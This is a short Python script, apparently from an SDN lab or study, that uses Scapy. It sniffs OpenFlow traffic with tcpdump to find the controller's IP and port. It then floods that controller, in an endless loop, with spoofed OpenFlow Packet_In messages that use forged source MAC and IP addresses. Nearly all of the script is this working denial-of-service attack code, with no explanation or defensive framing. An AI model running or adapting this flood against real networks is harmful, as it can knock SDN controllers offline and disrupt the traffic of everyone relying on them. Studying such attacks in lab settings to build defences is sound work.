import subprocess as sub
import scapy
from scapy.all import *
from scapy.contrib import openflow as op


src_ip = "192.168.0.2"
interface = "eth0"
ctrl_ip="192.168.0.3"
ctrl_port=6653

def ctrl_data():
        data=[]
        capture = sub.Popen(('sudo', 'tcpdump', '-ni', 'eth0', 'tcp', 'port', '6653', '-w', 'capture.pcap','-c','20'), stdout=sub.PIPE)
        for row in iter(capture.stdout.readline, b''):
                print (row.rstrip())
        cap=rdpcap('capture.pcap')
        #i=0
        for caps in cap:
                try:
                        if (caps[3].type == 5) and not data:
                                print('enter')
                                ctrl_ip = caps[1].src
                                ctrl_port = caps["IP"].sport
                                print('\nController IP:' +ctrl_ip)
                                data.append(ctrl_ip)
                                print('Controller port:' )
                                print(ctrl_port)
                                print('\n')
                                data.append(ctrl_port)

                except:
                        pass
        if not data:
                msg = 'It did not enter the if loop'
                data.append(msg)
        return data


def attack(ctrl_ip, ctrl_port):
        i=0
        while True:
                packetin = Ether(src="02:42:c0:a8:00:02", dst="02:42:c0:a8:00:03")/IP(dst= ctrl_ip, src= src_ip)/op.TCP(sport= 46688 , dport= ctrl_port, seq=i)/op.OFPTPacketIn()
                i=i+1
        #       packetin.show()
                sendp(packetin, iface = interface)
                print('Sending Packet_In to controller')
